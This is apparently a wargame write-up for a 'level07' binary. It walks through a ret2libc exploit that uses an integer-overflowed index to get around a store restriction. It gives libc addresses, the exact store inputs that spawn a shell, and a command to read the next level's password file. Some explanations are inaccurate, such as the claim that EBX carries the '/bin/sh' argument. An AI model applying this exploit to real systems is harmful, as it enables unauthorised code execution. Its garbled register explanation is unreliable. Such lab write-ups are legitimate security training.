We need to exploit a **buffer overflow** vulnerability in the program to overwrite the **EIP (Instruction Pointer)** and redirect the program's execution flow. We will use **integer overflow** to bypass a restriction on certain memory indices, allowing us to overwrite the **EIP** and execute a **ret2libc** attack.

### Key Points to Understand

Lets find the EIP save relative to the start of the buffer: 4 pushed registers (16) and esp, 0xfffffff0 (alignment to 16 bytes, removed 12 bytes) size of stack: 0x1d0 (464) start of buffer: esp+0x24 (36)

(464-36+16+12)/4 = 114

1. **Buffer Overflow**: The program allows us to store integer values in memory. By carefully crafting the input, we can overwrite critical parts of memory, such as the **EIP**, which controls the program's execution flow.

2. **Index Restrictions**: The program prevents writing to indices that are either a multiple of **3** or greater than **127**. This is a protection measure to prevent certain types of attacks. To bypass this restriction, we need to use a technique called **integer overflow** to reach the indices we need to target.

3. **Overflow Mechanism**: We need to manipulate the index value so that it points to an address that is divisible by **3**. By using an **integer overflow**, we can overflow the index value and access the restricted indices.

### Detailed Breakdown

1. **Overflowing the Index**:
   - We are given that the buffer offset is **456** bytes. Since the buffer stores integers, this corresponds to **114** integers (as each integer is 4 bytes, and 456 / 4 = 114).
   - However, the program restricts access to indices divisible by **3**. Since **114** is a multiple of **3**, we need to use **integer overflow** to target this index.
   - The formula for the index is:

   ```C
   unsigned int index = (UINT_MAX + 1) / 4 + 114;
   ```

   - Since `UINT_MAX` is **4294967295**, the value of `index` becomes **1073741938** (which is **114** after the overflow).

2. **Finding the Addresses**:
   - Next, we need to find the addresses of functions and strings we want to call when the program executes our code.
   - We use the following addresses in the **ret2libc** attack:
     - `system()` function: `0xf7e6aed0` → **4159090384**
     - `exit()` function: `0xf7e5eb70` → **4159040368**
     - `/bin/sh` string: `0xf7f897ec` → **4160264172**

3. **Building the Exploit**:
   - We need to store these addresses at specific indices, which are **114**, **115**, and **116**.
   - By storing these values in memory, we will set the **EIP** to the address of `system()`, the **EBX** register to the address of `/bin/sh`, and finally call `exit()` to gracefully terminate the program.

4. **The Exploit**:
   - The idea is to use the **store** command to place the addresses at the correct indices:
     - **Store** the address of `system()` at index **1073741938** (114).
     - **Store** the address of `exit()` at index **115**.
     - **Store** the address of `/bin/sh` at index **116**.

   - After these values are stored, we invoke the `quit` command. This will cause the program to exit, but because of the overwritten **EIP**, the program will jump to the `system()` function, with the argument `/bin/sh`, giving us a shell.

5. **Full Example**:

   - Run the program:

   ```bash
   ./level07
   ```

   - Store the required values:

   ```bash
   Input command: store
   Number: 4159090384
   Index: 1073741938  # system() address

   Input command: store
   Number: 4159040368
   Index: 115  # exit() address

   Input command: store
   Number: 4160264172
   Index: 116  # /bin/sh address
   ```

   - Exit the program:

   ```bash
   Input command: quit
   ```

   - After exiting, the program will execute the `system("/bin/sh")` command, giving us a shell. We can then check for the flag:

   ```bash
   cat /home/users/level08/.pass
   ```

### Final Notes

- The **ret2libc** attack works by chaining the addresses of existing functions in libc to perform arbitrary actions. In this case, it allows us to run a shell.
- The **integer overflow** is used to bypass the program's restriction on writing to indices that are divisible by **3**.
- The **EIP** is overwritten with the address of `system()`, which takes `/bin/sh` as an argument, and then we call `exit()` to clean up and terminate the program.

